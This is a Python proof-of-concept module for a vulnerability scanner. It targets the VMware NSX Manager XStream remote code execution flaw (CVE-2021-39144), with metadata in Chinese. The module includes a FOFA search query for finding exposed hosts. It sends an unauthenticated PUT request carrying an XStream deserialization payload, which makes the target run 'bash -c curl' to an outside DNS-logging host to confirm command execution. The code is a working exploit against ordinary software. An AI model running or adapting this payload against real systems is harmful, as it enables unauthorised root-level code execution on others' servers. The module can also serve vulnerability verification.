# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,get_ceye_dns,verify_ceye_dns
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "VMware NSX Manager XStream 远程代码执行漏洞（CVE-2021-39144）",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "VMware NSX Manager",                     # 漏洞应用名称
        "AppVersion" : "VMware Cloud Foundation 3.x && NSX Manager Data Center for vSphere 6.4.13 以上",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            由于在 VMware Cloud Foundation (NSX-V) 中使用 XStream 进行序列化而未经身份验证，黑客可以构造恶意数据包从而造成远程代码执行漏洞。
            VMware Cloud Foundation 3.x 和更具体的 NSX Manager Data Center for vSphere 6.4.13 及更高版本容易受到远程命令执行的攻击。
            利用该漏洞可获得 root 权限。

            修复的话直接升到Cloud Foundation 4.x吧，3.x已经被官方抛弃了。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="VMware Appliance Management"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        success,dns_flag = get_ceye_dns()
        if success == False:
            return [False,dns_flag]

        url = self.target + "/api/2.0/services/usermgmt/password/abc" # url自己按需调整
        data = """
<sorted-set>
<string>foo</string>
<dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
    <target class="java.lang.ProcessBuilder">
        <command>
        <string>bash</string>
        <string>-c</string>
        <string>curl %s</string>
        </command>
    </target>
    <action>start</action>
    </handler>
</dynamic-proxy>
</sorted-set>
""" % dns_flag

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/xml",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.put(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            flager = verify_ceye_dns(dns_flag)

            if flager == True:
                vuln = [True,dns_flag]
            elif flager == False:
                vuln = [False,dns_flag]
            else:
                vuln = [False,flager]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()